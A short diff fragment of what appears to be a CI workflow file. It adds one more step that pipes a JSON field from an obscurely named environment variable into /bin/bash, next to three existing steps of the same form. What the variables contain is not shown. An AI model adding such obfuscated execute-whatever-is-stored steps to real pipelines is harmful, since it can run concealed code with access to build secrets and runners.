@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$xatun24912" | jq -r .a0899 | /bin/bash
           echo $wa7 | jq -r .cjg52163 | /bin/bash
           echo $i685 | jq -r .xkd7 | /bin/bash
+          echo $vp405 | jq -r .okffk259 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
